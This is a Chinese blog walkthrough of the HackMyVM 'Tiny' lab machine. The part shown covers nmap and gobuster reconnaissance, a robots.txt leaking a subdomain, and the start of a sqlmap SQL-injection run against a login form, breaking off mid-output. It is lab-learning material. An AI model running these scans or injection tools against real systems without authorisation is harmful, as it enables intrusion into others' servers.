<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>HackMyVM-Tiny | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"tao0845.github.io","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="ta0的小站" type="application/atom+xml"><meta name="description" content="难度:Hard kali:192.168.56.104 靶机:192.168.56.157 端口扫描┌──(root㉿kali2)-[~&#x2F;Desktop] └─# nmap 192.168.56.157 -sV -A  Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-04-21 11:04 CST Nmap scan report for 19">
<meta property="og:type" content="article">
<meta property="og:title" content="HackMyVM-Tiny">
<meta property="og:url" content="https://tao0845.github.io/posts/3ca28c17/index.html">
<meta property="og:site_name" content="ta0的小站">
<meta property="og:description" content="难度:Hard kali:192.168.56.104 靶机:192.168.56.157 端口扫描┌──(root㉿kali2)-[~&#x2F;Desktop] └─# nmap 192.168.56.157 -sV -A  Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-04-21 11:04 CST Nmap scan report for 19">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/21/OpksIC.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/21/OpkYhL.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/21/Opkfti.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/21/OpkljX.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/21/OpkjWt.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/21/Opk2gx.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/21/Opk6sj.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/21/OpkXop.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/21/OpxG6c.png">
<meta property="article:published_time" content="2024-04-21T03:00:22.965Z">
<meta property="article:modified_time" content="2024-06-07T05:26:52.620Z">
<meta property="article:author" content="ta0">
<meta property="article:tag" content="tinypro+">
<meta property="article:tag" content="pydash.objects.invoke">
<meta property="article:tag" content="sql注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ooo.0x0.ooo/2024/04/21/OpksIC.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">114</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">14</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">184</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2814928906@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">web信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">3.</span> <span class="toc-text">目录扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#robots-txt"><span class="toc-number">3.1.</span> <span class="toc-text">robots.txt</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">sql注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">5.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83user"><span class="toc-number">6.</span> <span class="toc-text">提权user</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83root"><span class="toc-number">7.</span> <span class="toc-text">提权root</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-l"><span class="toc-number">7.1.</span> <span class="toc-text">sudo -l</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://tao0845.github.io/posts/3ca28c17/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">HackMyVM-Tiny</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2024-04-21 11:00:22" itemprop="dateCreated datePublished" datetime="2024-04-21T11:00:22+08:00">2024-04-21</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2024-06-07 13:26:52" itemprop="dateModified" datetime="2024-06-07T13:26:52+08:00">2024-06-07</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">4.2k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">24m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/HackMyVM/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">HackMyVM</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/tinypro/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">tinypro+</span></a><a class="tag-item" href="/tags/pydash-objects-invoke/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">pydash.objects.invoke</span></a><a class="tag-item" href="/tags/sql%E6%B3%A8%E5%85%A5/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">sql注入</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p><strong>难度:Hard</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.157</strong></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nmap 192.168.56.157 -sV -A </span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-04-21 <span class="token number">11</span>:04 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.157
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00062s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">997</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT     STATE SERVICE    VERSION
<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>        OpenSSH <span class="token number">9</span>.2p1 Debian <span class="token number">2</span> <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">256</span> dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp   <span class="token function">open</span>  http       Apache httpd <span class="token number">2.4</span>.57 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span>
<span class="token operator">|</span>_http-title: Blog
<span class="token operator">|</span>_http-generator: WordPress <span class="token number">6.3</span>.1
<span class="token operator">|</span>_http-server-header: Apache/2.4.57 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
<span class="token operator">|</span> http-robots.txt: <span class="token number">15</span> disallowed entries 
<span class="token operator">|</span> /wp-admin/ /cgi-bin/ /private/ /temp/ /backup/ /old/ 
<span class="token operator">|</span> /test/ /dev/ / /misc/ /downloads/ /doc/ /documents/ 
<span class="token operator">|</span>_/restricted/ /confidential/
<span class="token number">8888</span>/tcp <span class="token function">open</span>  http-proxy tinyproxy <span class="token number">1.11</span>.1
<span class="token operator">|</span>_http-title: <span class="token number">403</span> Access denied
<span class="token operator">|</span>_http-server-header: tinyproxy/1.11.1
MAC Address: 08:00:27:DF:80:54 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.62</span> ms <span class="token number">192.168</span>.56.157

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">9.11</span> seconds</code></pre>
<p>开放了22 80 8888三个端口</p>
<h2 id="web信息搜集"><a href="#web信息搜集" class="headerlink" title="web信息搜集"></a>web信息搜集</h2><p><img src="https://ooo.0x0.ooo/2024/04/21/OpksIC.png" alt="OpksIC.png" loading="lazy"><br>看一下源码<br><img src="https://ooo.0x0.ooo/2024/04/21/OpkYhL.png" alt="OpkYhL.png" loading="lazy"><br>拿到一个域名tiny.hmv添加到hosts</p>
<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># gobuster dir -u http://tiny.hmv -x html,txt,php,bak,zip --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>


<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://tiny.hmv
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              html,txt,php,bak,zip
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">273</span><span class="token punctuation">]</span>
/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">273</span><span class="token punctuation">]</span>
/index.php            <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://tiny.hmv/<span class="token punctuation">]</span>
/wp-content           <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">309</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://tiny.hmv/wp-content/<span class="token punctuation">]</span>
/wp-login.php         <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">5708</span><span class="token punctuation">]</span>
/license.txt          <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">19915</span><span class="token punctuation">]</span>
/wp-includes          <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">310</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://tiny.hmv/wp-includes/<span class="token punctuation">]</span>
/javascript           <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">309</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://tiny.hmv/javascript/<span class="token punctuation">]</span>
/readme.html          <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">7399</span><span class="token punctuation">]</span>
/robots.txt           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">815</span><span class="token punctuation">]</span>
/wp-trackback.php     <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">135</span><span class="token punctuation">]</span>
/wp-admin             <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">307</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://tiny.hmv/wp-admin/<span class="token punctuation">]</span>
/xmlrpc.php           <span class="token punctuation">(</span>Status: <span class="token number">405</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">42</span><span class="token punctuation">]</span>
/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">273</span><span class="token punctuation">]</span>
/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">273</span><span class="token punctuation">]</span>
/wp-signup.php        <span class="token punctuation">(</span>Status: <span class="token number">302</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://tiny.hmv/wp-login.php?action<span class="token operator">=</span>register<span class="token punctuation">]</span>
/server-status        <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">273</span><span class="token punctuation">]</span>
Progress: <span class="token number">1323360</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Finished
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></code></pre>
<h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># robots.txt for http://tiny.hmv</span>

<span class="token comment"># General settings</span>
User-agent: *
Crawl-delay: <span class="token number">10</span>

<span class="token comment"># Standard subdirectory disallow</span>
Disallow: /wp-admin/
Disallow: /cgi-bin/
Disallow: /private/
Disallow: /temp/
Disallow: /backup/

<span class="token comment"># Specific rules for known bots</span>
User-agent: Googlebot
Allow: /

User-agent: Bingbot
Allow: /
Disallow: /private/

<span class="token comment"># Additional sitemap references</span>
Sitemap: http://tiny.hmv/sitemap.xml
Sitemap: http://wish.tiny.hmv/sitemap.xml

<span class="token comment"># Restrictions for other directories</span>
Disallow: /old/
Disallow: /test/
Disallow: /dev/

<span class="token comment"># Restrict access for BadBot</span>
User-agent: BadBot
Disallow: /

<span class="token comment"># Miscellaneous</span>
Disallow: /misc/
Disallow: /downloads/
Disallow: /doc/
Disallow: /documents/

<span class="token comment"># For any other miscellaneous user-agents, apply general restrictions</span>
User-agent: *
Disallow: /restricted/
Disallow: /confidential/</code></pre>
<p>又出现个子域 wish.tiny.hmv，也添加到hosts<br><img src="https://ooo.0x0.ooo/2024/04/21/Opkfti.png" alt="Opkfti.png" loading="lazy"><br>进入是一个登录界面</p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>随便输入账号密码抓个请求包放sqlmap跑一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># sqlmap -l sql.txt --batch --dbs                     </span>
        ___
       __H__                                                                                                                                 
 ___ ___<span class="token punctuation">[</span>.<span class="token punctuation">]</span>_____ ___ ___  <span class="token punctuation">&#123;</span><span class="token number">1.8</span>.2<span class="token comment">#stable&#125;                                                                                                     </span>
<span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token punctuation">[</span>.<span class="token punctuation">]</span>     <span class="token operator">|</span> <span class="token builtin class-name">.</span><span class="token string">'| . |                                                                                                                    
|___|_  [(]_|_|_|__,|  _|                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class="token keyword">for</span> any misuse or damage caused by this program

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> starting @ <span class="token number">11</span>:29:37 /2024-04-21/

<span class="token punctuation">[</span><span class="token number">11</span>:29:37<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> sqlmap parsed <span class="token number">1</span> <span class="token punctuation">(</span>parameter unique<span class="token punctuation">)</span> requests from the targets list ready to be tested
<span class="token punctuation">[</span><span class="token number">1</span>/1<span class="token punctuation">]</span> URL:
GET http://wish.tiny.hmv:80/index.php
POST data: <span class="token assign-left variable">username</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">wish</span><span class="token operator">=</span><span class="token number">123456</span>%0D%0A
<span class="token keyword">do</span> you want to <span class="token builtin class-name">test</span> this URL? <span class="token punctuation">[</span>Y/n/q<span class="token punctuation">]</span>
<span class="token operator">></span> Y
<span class="token punctuation">[</span><span class="token number">11</span>:29:37<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing URL <span class="token string">'http://wish.tiny.hmv:80/index.php'</span>
<span class="token punctuation">[</span><span class="token number">11</span>:29:37<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> resuming back-end DBMS <span class="token string">'mysql'</span> 
